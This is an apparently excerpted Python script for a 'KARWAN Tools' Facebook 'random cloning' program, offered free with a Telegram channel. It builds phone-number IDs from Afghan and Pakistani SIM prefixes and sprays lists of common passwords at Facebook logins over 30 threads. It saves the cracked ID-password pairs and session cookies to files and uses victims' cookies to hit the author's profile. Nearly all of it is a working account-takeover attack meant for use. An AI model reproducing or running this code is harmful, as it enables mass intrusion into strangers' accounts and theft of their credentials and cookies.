...
from time import sleep
from time import sleep as waktu
print('\x1b[1;92m   join my telegram channel...');time.sleep(1)
os.system("xdg-open https://t.me/Karwantech12");time.sleep(3)
print('\n\033[1;36m   Welcome To KARWAN Tools');time.sleep(3)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
...
\033[1;37m══════════════════════════════════════════════════
\033[1;97m[•] AUTHOR   \033[1;31m: \033[1;34m MURTAZA BAGHLANI & ARASH BADAKHSHI  
\033[1;97m[•] FACEBOOK \033[1;31m: \033[1;34m MURTAZA BAGHLANI
\033[1;97m[•] TEAM \033[1;31m    : \033[1;34m KARWAN TECH
\033[1;97m[•] TELEGRAM \033[1;31m: \033[1;34m t.me/Karwantech12
\033[1;97m[•] STATUS\033[1;31m   : \033[1;34m FREE
\033[1;37m══════════════════════════════════════════════════
""")
clear()
xxxx = str(len(ugen))
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://www.facebook.com/Murtaza4044', cookies={'cookie': coki}).text, 'html.parser')
...
def main():
    ...
    clear()
    print(f"\033[1;97m[1] AFG RANDOM CLONING")
    print(f"\033[1;97m[2] PAK RANDOM CLONING")
    print(f"\033[1;97m[3] TELEGRAM CHANNEL (\033[1;92mjoin\033[1;97m)")
    print(f"\033[1;97m[0] \033[1;91mEXIT ")
    print('\033[1;37m══════════════════════════════════════════════════') 
    kingbasir = input("\033[1;37m CHOOSE OPTION : ")
    if kingbasir in ["1","01"]:
        afg()
    elif kingbasir in ["2","02"]:
        pak()
    elif kingbasir in ["3","03"]:
        os.system("xdg-open https://t.me/Karwantech12");main()
    elif kingbasir in ["0","00"]:
       exit("  Tanks For Use  ")
    else:
...
def afg():
    os.system("clear")
    print(logo)
    print("\033[1;97m[1] METHOD  _1_")
    print("\033[1;97m[2] METHOD  _2_")
    print("\033[1;97m[3] METHOD  _3_ (pak)")
    print('\033[1;37m══════════════════════════════════════════════════') 
    hajibasir = input("\033[1;37mCHOOSE METHOD : ")
    if hajibasir in ["1","01"]:
        afg1()
    elif hajibasir in ["2","02"]:
        afg2()
    elif hajibasir in ["3","03"]:
        afg3()
             
def pak():
    print("\033[1;97m[1] METHOD  _1_")
    print("\033[1;97m[2] METHOD  _2_")
    print("\033[1;97m[3] METHOD  _3_")
    print('\033[1;37m══════════════════════════════════════════════════') 
    basir001 = input("\033[1;97mCHOOSE METHOD :")
    if basir001 in ["1","01"]:
        pak1()
    elif basir001 in ["2","02"]:
        pak2()
    elif basir001 in ["3","03"]:
        pak3()
...
def afg1():
    ...
    print(logo)
    clear()
    print(f'\033[1;97mMTN SIM CODES : \033[1;96m9377, 9376')
    print(f'\033[1;97mROSHAN SIM CODES : \033[1;96m9379, 9372')
    print(f'\033[1;97mAWCC + ETISALAT SIM CODES : \033[1;96m9370, 9378')
    print('\033[1;37m══════════════════════════════════════════════════')
    code = input('\033[1;37mPUT CODE : ')
    os.system("clear")
    print(logo)   
    print('\033[1;37m══════════════════════════════════════════════════') 
    limit = int(input('\033[1;97mCHOOSE LIMIT : \033[1;96m2000, 3000, 50000, 100000\n\033[1;37m══════════════════════════════════════════════════\n\033[1;97mPUT IDS LIMIT : \033[1;96m'))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97mSIM CODE YOU CHOICE : \033[1;96m"+code)
        print(f"\033[1;97mTOTAL IDZ : \033[1;96m["+tl+"] ")
        print('\033[1;37m══════════════════════════════════════════════════') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;37m══════════════════════════════════════════════════') 
        for love in user:
            uid = code+love
            pwx = [love,'afghan12345', 'afghan123', 'afghanistan', 'khankhan', '۱۰۰۲۰۰', '500600', '100200', '۱۲۳۴۵۶', 'kabul123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mIDS SAVE IN : KARWAN-OK & KARWAN-CP.txt')
    input(f'\033[1;97mPRESS ENTER TO BACK MENU');os.system("clear");main()
...
def afg2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'afghan1234', '۱۰۰۲۰۰', 'kabul123', 'afghanistan', '۱۲۳۴۵۶', '۱۲۳۴۵۶۷۸۹', 'khankhan', 'afghan', 'khan123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
...
def afg3():
    ...
    print(logo)
    clear()
    print(f'\033[1;97mPAKISTAN SIM CODES : \033[1;96m92304, 92308 , 92333')
    print(f'\033[1;97mPAKISTAN SIM CODES : \033[1;96m0301, 0304')
    print('\033[1;37m══════════════════════════════════════════════════') 
    code = input('\033[1;37mPUT CODE : ')
    os.system("clear")
    print(logo)   
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khankhan', 'khan123', 'Pakistan', 'malik123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
...
def pak1():
    ...
    print(logo)
    clear()   
    print(f'\033[1;97mPAK SIM CODES : \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;37m══════════════════════════════════════════════════') 
    code = input('\033[1;37mPUT CODE : ')
    os.system("clear")
    print(logo)   
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khankhan', 'pakistan', 'khan123', 'ahmad123', 'king123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
...
def pak2():
    ...
    print(f'\033[1;97mPAK SIM CODES : \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;37m══════════════════════════════════════════════════') 
    code = input('\033[1;37mCHOOSE CODE : ')
    os.system("clear")
    print(logo)   
    print('\033[1;37m══════════════════════════════════════════════════') 
    limit = int(input('\033[1;97mCHOOSE LIMIT : \033[1;96m2000, 3000, 50000, 100000\n\033[1;37m══════════════════════════════════════════════════\n\033[1;97mPUT IDS LIMIT : \033[1;96m'))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khan1122', 'khankhan', 'king123', 'malik123', 'ahmad123']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
...
def pak3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khan786', 'khankhan', 'pakistan', 'imrankhan']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;37m══════════════════════════════════════════════════') 
    print('\033[1;97mCOMPLETED\n\033[1;97mYOUR OK IDS : \033[1;96m'+str(len(ok))+'\n\033[1;97mTOTAL CP IDS : \033[1;96m'+str(len(cp)))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mKARWAN-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/KARWAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[KARWAN-CP] \033[1;91m '+uid+' | '+ps+' ')
                    open('/sdcard/KARWAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[KARWAN] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
